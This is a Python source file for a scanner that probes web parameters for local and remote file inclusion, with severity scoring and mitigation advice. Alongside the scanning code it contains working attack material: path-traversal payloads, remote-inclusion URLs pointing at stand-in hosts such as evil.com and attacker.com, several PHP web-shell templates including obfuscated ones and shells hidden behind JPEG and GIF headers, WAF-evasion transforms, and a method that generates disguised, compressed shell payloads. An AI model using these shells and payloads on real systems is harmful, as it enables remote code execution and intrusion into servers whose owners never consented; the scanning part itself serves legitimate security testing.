import re
import logging
import requests
import gzip
import bz2
import zlib
import base64
from typing import Dict, List, Optional, Any, Callable
from datetime import datetime
from threading import Lock
from urllib.parse import urljoin, urlparse
import random

class LFIRFIScanner:
    """Scanner to detect Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities."""
    
    def __init__(self, callback: Optional[Callable] = None):
        self.results = []
        self.callback = callback
        self._lock = Lock()
        self.session = requests.Session()
        self.logger = logging.getLogger(__name__)
        
        # Common payloads for LFI
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "../../../../../../../../etc/passwd",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../windows/win.ini",
            "/proc/self/environ",
            "/var/log/apache2/access.log",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "expect://id",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+"
        ]
        
        # Common payloads for RFI
        self.rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://attacker.com/shell.php",
            "\\\\attacker.com\\share\\shell.php",
            "http://127.0.0.1/shell.php",
            "dict://attacker:6666/",
            "ldap://attacker:6666/",
            "gopher://attacker:6666/_"
        ]

        # Advanced and polymorphic shells
        self.shell_templates = {
            'basic_cmd': """
                <?php
                    $cmd = $_GET['cmd'];
                    system($cmd);
                ?>
            """,
            'stealth_eval': """
                <?php
                    $x = $_GET['x'];
                    $y = base64_decode($x);
                    eval($y);
                ?>
            """,
            'memory_shell': """
                <?php
                    @$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
                    @$_=/*-/*-*/"a"./*-/*-*/$_;
                    @$_/*-/*-*/($/*-/*-*/{"_P"."OS"."T"}[0])
                ?>
            """,
            'fileless_shell': """
                <?php
                    @extract($_REQUEST);
                    @die($cgi($cmd));
                ?>
            """,
            'image_shell': """
                ÿØÿà JFIF <?php system($_GET['cmd']); ?> ÿÛ
            """,
            'multipart_shell': """
                GIF89a
                <?php
                    $a = $_GET['a'];
                    $b = base64_decode($a);
                    eval($b);
                ?>
                /*ÿÿÿ*/
            """
        }

        # Compression and obfuscation techniques
        self.compression_techniques = {
            'gzip': lambda x: gzip.compress(x.encode()),
            'deflate': lambda x: zlib.compress(x.encode()),
            'bzip2': lambda x: bz2.compress(x.encode())
        }

        # WAF evasion techniques
        self.waf_evasion = {
            'comment_injection': lambda x: '/*!' + x + '*/',
            'space_substitution': lambda x: x.replace(' ', '/**/'),
            'string_concat': lambda x: '+'.join([f"chr({ord(c)})" for c in x]),
            'hex_encode': lambda x: ''.join([f"\\x{ord(c):02x}" for c in x])
        }

        # Advanced detection indicators
        self.advanced_indicators = {
            'memory_disclosure': [
                'PHP Notice',
                'Warning:',
                'stack trace:',
                'PATH=',
                'HTTP_USER_AGENT'
            ],
            'command_execution': [
                'uid=',
                'gid=',
                'groups=',
                '/bin/bash',
                'sh-'
            ],
            'source_disclosure': [
                '<?php',
                '<%',
                '<asp',
                '<script'
            ]
        }

        # File extensions and MIME types
        self.file_extensions = {
            'image': ['.jpg', '.png', '.gif', '.jpeg', '.bmp'],
            'document': ['.pdf', '.doc', '.txt', '.rtf'],
            'web': ['.php', '.php3', '.php4', '.php5', '.phtml'],
            'archive': ['.zip', '.tar', '.gz', '.rar'],
            'executable': ['.exe', '.dll', '.so', '.bin']
        }

    def scan_url(self, url: str, params: Optional[Dict[str, str]] = None) -> List[Dict[str, Any]]:
        """
        Scans a URL for LFI/RFI vulnerabilities.
        
        Args:
            url: URL to scan.
            params: Additional parameters for the request.
            
        Returns:
            List of scan results.
        """
        if not url:
            raise ValueError("URL cannot be empty")
            
        self.logger.info(f"Starting LFI/RFI scan on {url}")
        results = []
        
        # Scan for LFI
        for payload in self.lfi_payloads:
            try:
                result = self._test_lfi(url, payload, params)
                if result:
                    results.append(result)
            except Exception as e:
                self.logger.error(f"Error testing LFI payload {payload}: {str(e)}")
                
        # Scan for RFI
        for payload in self.rfi_payloads:
            try:
                result = self._test_rfi(url, payload, params)
                if result:
                    results.append(result)
            except Exception as e:
                self.logger.error(f"Error testing RFI payload {payload}: {str(e)}")
                
        return results

    def _test_lfi(self, url: str, payload: str, params: Optional[Dict[str, str]] = None) -> Optional[Dict[str, Any]]:
        """Tests a specific LFI payload."""
        # Prepare parameters
        test_params = params.copy() if params else {}
        
        # Try each parameter
        for param in test_params.keys():
            test_params[param] = payload
            try:
                response = self.session.get(url, params=test_params, timeout=10)
                if self._check_lfi_vulnerability(response):
                    result = self._create_result(
                        url=url,
                        payload=payload,
                        param=param,
                        vuln_type='LFI',
                        response=response
                    )
                    self._add_result(result)
                    return result
            except requests.RequestException as e:
                self.logger.warning(f"LFI request error for {url}: {str(e)}")
            
        return None

    def _test_rfi(self, url: str, payload: str, params: Optional[Dict[str, str]] = None) -> Optional[Dict[str, Any]]:
        """Tests a specific RFI payload."""
        # Prepare parameters
        test_params = params.copy() if params else {}
        
        # Try each parameter
        for param in test_params.keys():
            test_params[param] = payload
            try:
                response = self.session.get(url, params=test_params, timeout=10)
                if self._check_rfi_vulnerability(response):
                    result = self._create_result(
                        url=url,
                        payload=payload,
                        param=param,
                        vuln_type='RFI',
                        response=response
                    )
                    self._add_result(result)
                    return result
            except requests.RequestException as e:
                self.logger.warning(f"RFI request error for {url}: {str(e)}")
            
        return None

    def _check_lfi_vulnerability(self, response: requests.Response) -> bool:
        """Checks if the response indicates an LFI vulnerability."""
        content = response.text.lower()
        
        # Check each detection category
        for category, indicators in self.advanced_indicators.items():
            matches = sum(1 for ind in indicators if ind.lower() in content)
            if matches >= 2:  # At least 2 matches in a category
                return True
                
        return False

    def _check_rfi_vulnerability(self, response: requests.Response) -> bool:
        """Checks if the response indicates an RFI vulnerability."""
        content = response.text.lower()
        
        # Count matches for source disclosure indicators
        matches = sum(1 for ind in self.advanced_indicators['source_disclosure'] if ind.lower() in content)
        
        # If there are multiple indicators, it is more likely vulnerable
        return matches >= 2

    def _create_result(self, url: str, payload: str, param: str, 
                      vuln_type: str, response: requests.Response) -> Dict[str, Any]:
        """Creates a detailed scan result."""
        return {
            'url': url,
            'parameter': param,
            'vulnerability_type': vuln_type,
            'payload': payload,
            'response_code': response.status_code,
            'response_headers': dict(response.headers),
            'response_text': response.text[:1000],  # Limit size
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'severity': self._calculate_severity(vuln_type, response),
            'recommendations': self._get_recommendations(vuln_type)
        }

    def _calculate_severity(self, vuln_type: str, response: requests.Response) -> str:
        """Calculates the severity of the vulnerability."""
        if vuln_type == 'RFI':
            return 'CRITICAL'  # RFI allows remote code execution
        
        # For LFI, it depends on the exposed content
        content = response.text.lower()
        if any(ind in content for ind in ['root:', 'admin:', 'password']):
            return 'CRITICAL'
        elif any(ind in content for ind in ['<?php', '/etc/', 'system32']):
            return 'HIGH'
        return 'MEDIUM'

    def _get_recommendations(self, vuln_type: str) -> List[str]:
        """Generates mitigation recommendations."""
        common_recs = [
            'Implement strict input validation',
            'Use whitelists for allowed paths and files',
            'Implement proper access controls',
            'Update all dependencies and frameworks'
        ]
        
        if vuln_type == 'LFI':
            common_recs.extend([
                'Avoid passing file paths as parameters',
                'Use absolute, predefined paths',
                'Disable allow_url_include if possible'
            ])
        else:  # RFI
            common_recs.extend([
                'Disable allow_url_fopen and allow_url_include',
                'Implement URL validation',
                'Use only trusted local resources'
            ])
            
        return common_recs

    def _add_result(self, result: Dict[str, Any]) -> None:
        """Adds a result to the history and notifies via callback."""
        with self._lock:
            self.results.append(result)
            if self.callback:
                self.callback(result)

    def _analyze_response(self, response: requests.Response) -> Dict[str, Any]:
        """Enhanced heuristic analysis of responses."""
        score = 0
        evidence = []
        
        # Detection patterns
        indicators = {
            'error_disclosure': r'(warning|error|notice|undefined|invalid)',
            'path_disclosure': r'([A-Za-z]:\\|/var/www/|/home/|/etc/)',
            'command_output': r'(uid=\d+|root:|mysql:|www-data:)',
            'source_disclosure': r'(<\?php|<%|<asp|<script)'
        }
        
        # Analyze content
        content = response.text.lower()
        
        # Search for patterns
        for category, pattern in indicators.items():
            matches = re.findall(pattern, response.text, re.I)
            if matches:
                score += 1
                evidence.extend(matches[:3])  # Limit evidence to 3 matches per category
                
        # Analyze suspicious headers
        suspicious_headers = ['X-Powered-By', 'Server', 'X-AspNet-Version']
        for header in suspicious_headers:
            if header in response.headers:
                score += 0.5
                evidence.append(f"{header}: {response.headers[header]}")
                
        return {
            'score': score,
            'evidence': evidence,
            'is_vulnerable': score > 2,
            'confidence': min(score / 5 * 100, 100)  # Convert score to percentage
        }

    def generate_polymorphic_payload(self, template_type: str, evasion_techniques: List[str] = None) -> Dict[str, Any]:
        """Generates a polymorphic payload with evasion techniques."""
        if template_type not in self.shell_templates:
            raise ValueError(f"Invalid template type: {template_type}")
            
        # Get base template
        content = self.shell_templates[template_type]
        
        # Apply selected evasion techniques
        if evasion_techniques:
            for technique in evasion_techniques:
                if technique in self.waf_evasion:
                    content = self.waf_evasion[technique](content)
                    
        # Apply random compression
        compression = list(self.compression_techniques.keys())[0]
        compressed = self.compression_techniques[compression](content)
        
        return {
            'content': compressed,
            'original': content,
            'evasion_applied': evasion_techniques or [],
            'compression': compression
        }
